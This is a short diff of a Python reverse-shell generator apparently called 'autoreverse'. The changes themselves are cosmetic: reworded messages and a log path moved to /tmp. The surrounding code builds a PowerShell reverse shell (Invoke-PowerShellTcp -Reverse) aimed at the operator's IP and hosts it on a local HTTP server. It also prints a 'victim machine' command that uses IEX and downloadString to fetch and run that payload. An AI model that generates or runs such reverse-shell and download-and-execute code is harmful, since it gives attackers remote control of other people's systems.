@@ -132,7 +132,7 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         os.system('cp /opt/autoreverse/autoreverse.ps1 .')
         os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
         if args.httpserver != None:
-            print(blue('\nInstall your payload on the victim machine with: ') + red("\npowershell IEX(New-Object Net.WebClient).downloadString('http://" + IP + ":" + args.httpserver + "/" + file + "')"))
+            print(blue('\nInvoke your payload on the victim machine with: ') + red("\npowershell IEX(New-Object Net.WebClient).downloadString('http://" + IP + ":" + args.httpserver + "/" + file + "')"))
         message(file)
     elif payload == 'exe' or payload == '.exe':
         file = 'autoreverse.exe'
@@ -176,9 +176,9 @@ def listeners():
 
 if args.httpserver != None:
     Check_Port(args.httpserver)
-    server = 'python3 -m http.server ' + str(args.httpserver) + ' > autoreverse.log 2>/dev/null &'
+    server = 'python3 -m http.server ' + str(args.httpserver) + ' > /tmp/autoreverse.log 2>/dev/null &'
     os.system(server)
-    print(blue('HTTP Server running on port ' + str(args.httpserver)))
+    print(blue('\nHTTP Server running on port ' + str(args.httpserver)))
 if args.listener != None:
     Check_Port(args.port)
     listeners()
